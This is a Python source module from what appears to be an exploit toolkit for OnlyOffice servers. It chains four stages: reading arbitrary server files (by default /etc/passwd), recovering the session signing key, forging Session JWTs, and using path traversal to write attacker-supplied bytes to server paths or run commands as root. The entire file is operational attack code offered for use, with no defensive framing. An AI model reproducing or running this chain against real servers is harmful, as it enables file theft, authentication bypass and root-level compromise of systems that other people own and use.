"""Shared file-read, Session-token forgery and optional traversal stages."""

import sys
import uuid
from contextlib import ExitStack
from pathlib import Path

from onlyoffice_common import (
    ExploitError,
    OutputFile,
    forge_session_token,
    read_local_file,
    read_server_file,
    recover_session_key,
    remote_path,
    status,
)
from onlyoffice_execution import Execution, add_execution_args


def add_chain_args(parser) -> None:
    parser.add_argument("--read-file", help="absolute server file to recover (default: /etc/passwd)")
    parser.add_argument(
        "--read-output",
        type=Path,
        help="local recovered-file destination (default: onlyoffice-server-file.bin)",
    )
    parser.add_argument("--document-key", help="document key to place in the forged JWT")
    parser.add_argument("--target-path", help="also write an absolute server path using format traversal")
    data = parser.add_mutually_exclusive_group()
    data.add_argument("--write-data", help="UTF-8 text to write")
    data.add_argument("--write-data-file", type=Path, help="local file containing the exact bytes to write")
    parser.add_argument("--output-token", type=Path, help="save the forged Session JWT to a private file")
    parser.add_argument("--show-token", action="store_true", help="print the reusable JWT to stdout")
    parser.add_argument(
        "--overwrite", action="store_true", help="replace existing local output files on success"
    )
    parser.add_argument(
        "--command", help="instead compose traversal and the root helper to execute a command"
    )
    add_execution_args(parser)


class Chain:
    def __init__(self, args):
        self.args = args
        self.stack = ExitStack()
        self.payload = None

    def __enter__(self):
        try:
            args = self.args
            if args.command is not None and (args.target_path or args.read_file or args.read_output):
                raise ExploitError(
                    "--command cannot be combined with --target-path, --read-file or --read-output"
                )
            if args.command is not None and args.show_token:
                raise ExploitError("use --output-token with --command; stdout is reserved for command output")
            has_data = args.write_data is not None or args.write_data_file is not None
            if bool(args.target_path) != has_data:
                raise ExploitError("--target-path requires exactly one of --write-data or --write-data-file")
            self.path = remote_path(args.read_file or "/etc/passwd", "--read-file")
            self.document_key = args.document_key or f"r7jwt{uuid.uuid4().hex}"
            if not self.document_key or any(c in self.document_key for c in "\\/\x00"):
                raise ExploitError(
                    "--document-key must be nonempty and must not contain path separators or NUL"
                )
            if args.target_path:
                remote_path(args.target_path, "--target-path")
                self.payload = (
                    read_local_file(args.write_data_file, "--write-data-file")
                    if args.write_data_file
                    else args.write_data.encode()
                )
                if not self.payload:
                    raise ExploitError("empty writes are unsupported by the vulnerable save branch")
            read_path = args.read_output or Path("onlyoffice-server-file.bin")
            outputs = ([read_path] if args.command is None else []) + (
                [args.output_token] if args.output_token else []
            )
            if len({path.resolve() for path in outputs}) != len(outputs):
                raise ExploitError("local output paths must be distinct")
            inputs = [getattr(args, "token_file", None), args.write_data_file]
            if any(out.resolve() == item.resolve() for out in outputs for item in inputs if item):
                raise ExploitError("an output path would replace a local input")
            self.read_output = (
                self.stack.enter_context(OutputFile(read_path, overwrite=args.overwrite))
                if args.command is None
                else None
            )
            self.token_output = (
                self.stack.enter_context(OutputFile(args.output_token, overwrite=args.overwrite))
                if args.output_token
                else None
            )
            return self
        except BaseException:
            self.stack.close()
            raise

    def __exit__(self, *_args):
        self.stack.close()

    def run(self, client, opening_token: str) -> int:
        args = self.args
        if self.read_output:
            data = read_server_file(client, opening_token, self.path)
            self.read_output.write(data)
            status(f"[+] read {len(data)} bytes from {self.path} to {self.read_output.path}")
        secret = recover_session_key(client, opening_token)
        token, expires = forge_session_token(secret, self.document_key)
        save_key = client.reserve_save(token, self.document_key)
        status(f"[+] forged Session JWT accepted for document key {self.document_key} (save key {save_key})")
        if self.token_output:
            self.token_output.write((token + "\n").encode("ascii"))
            status(f"[+] JWT saved to {self.token_output.path}; expires at Unix time {expires}")
        if args.show_token:
            print(token, flush=True)
        if args.command is not None:
            with Execution(
                client,
                opening_token,
                args.command,
                as_root=True,
                artifacts_dir=args.artifacts_dir,
                runtime_absent=args.runtime_absent,
                keep_artifacts=args.keep_artifacts,
            ) as execution:
                execution.install_traversal(token, self.document_key)
                output, code, cleanup = execution.wait(args.timeout)
            sys.stdout.buffer.write(output)
            sys.stdout.buffer.flush()
            return 4 if cleanup not in {"ok", "kept"} else 3 if code else 0
        if self.payload is not None:
            client.write_server_file(token, self.document_key, save_key, args.target_path, self.payload)
            recovered = read_server_file(client, opening_token, args.target_path)
            if recovered != self.payload:
                raise ExploitError("write was accepted but read-back did not match the supplied bytes")
            status(f"[+] verified {len(self.payload)} bytes written to {args.target_path}")
        if not args.output_token and not args.show_token:
            status("[*] token value withheld; use --output-token or --show-token to retain it")
        return 0
